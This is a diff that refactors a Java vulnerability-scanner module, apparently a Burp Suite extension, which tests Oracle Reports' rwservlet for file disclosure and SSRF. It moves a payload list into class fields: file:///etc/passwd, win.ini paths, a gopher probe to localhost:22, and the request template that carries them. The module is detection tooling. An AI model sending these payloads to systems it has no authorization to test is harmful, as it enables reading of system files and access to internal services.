@@ -107,6 +107,14 @@ public class OracleReportService implements IModule {
             "xmldata"
     );
 
+    private static List<String> LFI_FILES = Arrays.asList("\"file:///etc/passwd\"",
+            "\"file://c:/windows/win.ini\"",
+            "\"file://c:/winnt/win.ini\"",
+            "\"gopher://localhost:22/ss%0d%0a\""
+    );
+
+    private static String BASE_REQUEST = "/reports/rwservlet?report=test.pdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER=%s";
+
     /**
      * Test Remote file disclosure and SSRF issues on servlet
      * "/reports/rwservlet"
@@ -123,14 +131,7 @@ public class OracleReportService implements IModule {
         String protocol = url.getProtocol();
         Boolean isSSL = (protocol.equals("https"));
         IExtensionHelpers helpers = callbacks.getHelpers();
-
-        List<String> LFI_FILES = Arrays.asList("\"file:///etc/passwd\"",
-                "\"file://c:/windows/win.ini\"",
-                "\"file://c:/winnt/win.ini\"",
-                "\"gopher://localhost:22/ss%0d%0a\""
-        );
-
-        String BASE_REQUEST = "/reports/rwservlet?report=test.pdf+desformat=html+destype=cache+JOBTYPE=rwurl+URLPARAMETER=%s";
+        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
 
         for (String LOCAL_FILE : LFI_FILES) {
             String RWSERVLET_ATTEMPT = String.format(BASE_REQUEST, LOCAL_FILE);
@@ -150,7 +151,7 @@ public class OracleReportService implements IModule {
                     if (HTTPMatcher.isWinINI(responseBytes, helpers) || HTTPMatcher.isEtcPasswdFile(responseBytes, helpers)) {
                         issues.add(new CustomScanIssue(
                                 baseRequestResponse.getHttpService(),
-                                helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                                reqInfo.getUrl(),
                                 new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                 TITLE_LOCAL_FILE_DISCLOSURE,
                                 DESCRIPTION_LOCAL_FILE_DISCLOSURE,
@@ -174,7 +175,7 @@ public class OracleReportService implements IModule {
 
                             issues.add(new CustomScanIssue(
                                     baseRequestResponse.getHttpService(),
-                                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                                    reqInfo.getUrl(),
                                     new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                     TITLE_SSRF,
                                     DESCRIPTION_SSRF,
@@ -342,7 +343,7 @@ public class OracleReportService implements IModule {
 
                                 issues.add(new CustomScanIssue(
                                         baseRequestResponse.getHttpService(),
-                                        helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                                        reqInfo.getUrl(),
                                         new CustomHttpRequestResponse(oastest, responseBytes, baseRequestResponse.getHttpService()),
                                         TITLE_INFO_DISCLOSURE + " - " + ORACLE_REPORT_SERVICE_PATH,
                                         DESCRIPTION_INFO_DISCLOSURE + "<br /><br /><b>Path: " + ORACLE_REPORT_SERVICE_PATH + "</b><br />",
